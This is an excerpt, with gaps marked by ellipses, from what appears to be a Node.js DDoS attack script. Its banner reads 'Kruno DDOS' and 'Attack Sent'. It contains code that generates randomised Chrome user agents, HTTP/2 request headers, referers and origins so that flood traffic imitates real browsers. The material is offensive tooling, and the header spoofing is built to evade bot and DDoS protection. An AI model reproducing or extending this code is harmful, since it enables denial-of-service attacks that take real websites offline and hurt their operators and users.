...
if (cluster.isMaster) {
  ...
  console.log('\x1b[38;2;243;12;255m╔═════════════╦[+]║Attack \x1b[38;5;55mSent║[+]╦═════════════╗\x1b[0m');
    ...
    console.log(`\x1b[1;36m  [Owner]    : \x1b[38;5;55mShinonome x Alex\x1b[0m`);
    console.log('\x1b[38;2;243;12;255m╚═════════════╩[+]║Kruno \x1b[38;5;55mDDOS║[+]╩═════════════╝\x1b[0m');
...
// Hàm giả định cho uapick()
function uapick() {
    const chromeVersion = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
    const fullVersion = `${chromeVersion}.0.${Math.floor(Math.random() * 6000)}.${Math.floor(Math.random() * 200)}`;
    return `Mozilla/5.0 (Windows NT ${Math.random() < 0.7 ? "10.0" : "11.0"}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${fullVersion} Safari/537.36`;
}

// Hàm headerFunc mới
const headerFunc = (parsedTarget) => {
    const chromeVersion = Math.floor(Math.random() * (139 - 127 + 1)) + 127;
    return {
        ":method": "GET",
...
function generateHeaders(browser, parsedTarget) {
    ...
    // Chọn giá trị sec-fetch-site trước
    ...
    const headers = {
        ...
        // Chỉ thêm referer nếu sec-fetch-site không phải "none"
        "referer": secFetchSite !== "none" ? referers[Math.floor(Math.random() * referers.length)] : undefined,
        "origin": Math.random() < 0.7 && secFetchSite !== "none" ? origins[Math.floor(Math.random() * origins.length)] : undefined,
